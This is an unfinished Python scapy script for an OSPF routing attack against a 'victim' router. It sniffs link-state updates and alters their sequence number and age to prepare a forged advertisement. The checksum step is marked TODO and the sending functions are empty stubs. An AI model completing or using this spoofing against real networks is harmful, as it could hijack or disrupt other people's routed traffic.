#!/usr/bin/env python

import termcolor as T # grey red green yellow blue magenta cyan white
import os
import sys
import ctypes
import datetime

from subprocess import Popen, PIPE
from scapy.all import *
from random import randint
from time import sleep


load_contrib("ospf")


VICTIM_ROUTER = '4.4.4.4'


eight_bit_space = [1L, 2L, 4L, 8L, 16L, 32L, 64L, 128L]


def pt():
	# print time
	print datetime.datetime.now().strftime("%H:%M:%S")


def log(s, col="green"):
	print T.colored(s, col)


def frame_callback(frame):

	if frame.getlayer(IP) and frame.getlayer(IP).proto == 89: # OSPF

		ospf_packet = frame.getlayer(IP).payload

		if ospf_packet.type == 4: # LS Update
			for lsa in ospf_packet[OSPF_Hdr].lsalist:
				if lsa.adrouter == VICTIM_ROUTER:
					print '############################################################ before'
					lsa.show()

					# crafting trigger lsa

					# sequence number
					triggerLSAseqNum = lsa.seq + 1
					lsa.seq = triggerLSAseqNum

					# age
					lsa.age = 0

					# checksum
					# TODO continue

					print '############################################################ after'
					lsa.show()

					sys.stdout.flush()


def capture_ospf_messages():
	sniff(prn=frame_callback, filter='ip', store=0)
	

def send_trigger_lsa():
	pass


def send_disguised_lsa():
	pass


def main():
	capture_ospf_messages()

	send_trigger_lsa()

	send_disguised_lsa()


if __name__ == "__main__":
	main()

